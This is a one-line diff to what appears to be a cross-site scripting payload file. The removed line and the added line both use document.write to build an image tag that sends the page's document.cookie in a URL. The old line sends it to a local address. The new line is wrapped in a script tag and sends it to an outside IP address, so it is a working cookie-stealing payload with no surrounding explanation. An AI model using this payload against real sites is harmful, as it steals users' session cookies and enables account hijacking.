@@ -1,1 +1,1 @@
-document.write('<img src="http://127.0.0.1:5000/index.gif?cookie=' + document.cookie + '" />')
+<script>document.write('<img src="http://46.101.172.105/asd?cookie=' + document.cookie + '" />')</script>
